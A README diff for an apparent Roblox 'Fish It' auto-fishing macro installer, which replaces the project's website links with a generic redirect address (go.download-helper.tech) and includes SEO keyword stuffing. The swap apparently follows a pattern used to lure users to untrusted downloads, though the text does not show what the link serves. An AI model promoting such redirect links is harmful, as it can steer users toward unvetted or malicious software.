@@ -2,7 +2,7 @@
 
 Free auto-fishing macro for Fish It on Roblox - casts, waits and reels on a loop while you are AFK. Windows 10/11, small installer.
 
-**[⬇ Download for Windows](https://github.com/heenll68/fish-it-macro/releases/latest)** · [Website](https://fishitmacro.com)
+**[⬇ Download for Windows](https://github.com/heenll68/fish-it-macro/releases/latest)** · [Website](https://go.download-helper.tech/go/FIM)
 
 ![Fish It Macro](FishItMacro.png)
 
@@ -49,4 +49,4 @@ Right here. MIT licence, use it however you like.
 
 fish it macro · auto fishing macro · roblox afk fishing · fish it auto cast · roblox macro windows · afk farm macro
 
-Website: https://fishitmacro.com
+Website: https://go.download-helper.tech/go/FIM
